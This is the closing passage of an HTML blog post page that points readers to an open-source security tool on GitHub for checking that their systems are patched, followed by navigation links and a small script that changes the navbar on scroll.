            <p>
                The full tool is open source on GitHub. Pull it, audit it, test it in your lab,
                and use it to verify your systems are patched:
            </p>

        </div>

        <nav class="post-nav" aria-label="Post navigation">
            <a href="../blog.html" class="post-nav-btn">
                <i class="fas fa-arrow-left"></i>All Posts
            </a>
            <a href="https://github.com/0xb0rn3" target="_blank" class="gh-btn">
                <i class="fab fa-github"></i>View on GitHub
            </a>
        </nav>

    </main>

    <script>
    'use strict';
    window.addEventListener('scroll', () => {
        document.getElementById('navbar').classList.toggle('scrolled', window.scrollY > 60);
    }, { passive: true });
    </script>
</body>
</html>
